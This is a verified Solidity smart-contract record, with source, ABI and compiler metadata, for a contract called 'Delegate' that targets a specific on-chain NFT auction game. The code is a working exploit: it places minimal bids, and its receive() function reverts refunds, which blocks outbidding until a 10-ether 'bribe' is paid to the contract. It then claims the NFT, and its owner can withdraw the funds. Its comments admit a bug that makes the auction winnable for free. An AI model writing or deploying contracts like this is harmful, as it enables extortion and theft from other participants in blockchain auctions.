{"SourceCode": "pragma solidity ^0.8.23;\r\n\r\ninterface IERC20 {\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address to, uint256 amount) external returns (bool);\r\n}\r\n\r\ninterface IGame {\r\n    function auctionEndTime() external view returns (uint);\r\n    function newBidEtherMin() external view returns (uint);\r\n    function nft() external view returns (address);\r\n}\r\n\r\n/**\r\n* Send bounty to this contract to resume game.\r\n* Upon unlock shares can be claimed.\r\n*\r\n* We like the art. So NFT will be sent to PXL deployer b/c of bug making auction effectively winnable for free.\r\n*\r\n* Go auction it in a real marketplace or whatever.\r\n*/\r\ncontract Delegate {\r\n    address public immutable owner;\r\n    address public immutable receiver = 0x28D808550ED0a9A15bD3B9103664B8C12aBFA740;\r\n\r\n    // pay to play\r\n    uint public bribe = 10 ether;\r\n    bool unlocked = false;\r\n    bool released = false;\r\n    \r\n    address game = 0xA99142657A223d1f3834326BCFaf7B938d9841fB;\r\n    address nft;\r\n\r\n    constructor() {\r\n        owner = msg.sender;\r\n    }\r\n\r\n    function execute() external payable {\r\n        require(msg.sender == owner);\r\n\r\n        nft = IGame(game).nft();\r\n\r\n        uint bid = IGame(game).newBidEtherMin();\r\n\r\n        (bool success,) = address(game).call{value: bid + 1}(abi.encodeWithSelector(0xf30e3658));\r\n        require(success);\r\n\r\n        if (msg.value > bid ) owner.call{value: msg.value - bid - 1}(\"\");\r\n    }\r\n\r\n    function executeMany(bytes calldata data, uint howMany) external payable {\r\n        require(msg.sender == owner);\r\n\r\n        uint bid = IGame(game).newBidEtherMin();\r\n\r\n        for (uint i = 0; i < howMany; i++) {\r\n            address(game).call{value: bid + 1}(data);\r\n            bid = bid == 0 ? bid : (bid * 5) / 100;\r\n        }\r\n    }\r\n\r\n    function release() external {\r\n        require(unlocked, \"Not enough bribe\");\r\n        require(block.timestamp >= IGame(game).auctionEndTime(), \"Not time\");\r\n\r\n        // claim NFT\r\n        address(game).call(\r\n            abi.encodeWithSelector(0x5ae2afa4)\r\n        );\r\n\r\n        // send NFT to PXL deployer\r\n        address(nft).call(\r\n            abi.encodeWithSelector(0x42842e0e, address(this), receiver, 1)\r\n        );\r\n\r\n        released = true;\r\n    \r\n    }\r\n\r\n    function withdraw(address what) external {\r\n        require(msg.sender == owner);\r\n\r\n        if(what == address(0)) {\r\n            payable(owner).call{value: address(this).balance}(\"\");\r\n        } else {\r\n            uint bal = IERC20(what).balanceOf(address(this));\r\n            IERC20(what).transfer(owner, bal);\r\n        }\r\n\r\n    }\r\n\r\n    receive() external payable {\r\n        if (!unlocked && address(this).balance >= bribe) {\r\n            unlocked = true;\r\n        }\r\n\r\n        if (tx.origin != owner && msg.sender == game) {\r\n            require(unlocked, \"Not enough bribe\");\r\n            require(released, \"Not released\");\r\n        }\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"bribe\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"execute\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"},{\"internalType\":\"uint256\",\"name\":\"howMany\",\"type\":\"uint256\"}],\"name\":\"executeMany\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"release\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"what\",\"type\":\"address\"}],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "Delegate", "CompilerVersion": "v0.8.23+commit.f704f362", "OptimizationUsed": "1", "Runs": "1000", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://11f8bb8661cfd4cc504326ac7d0e6e5c174310f7dad6536f7edc3279c757c938"}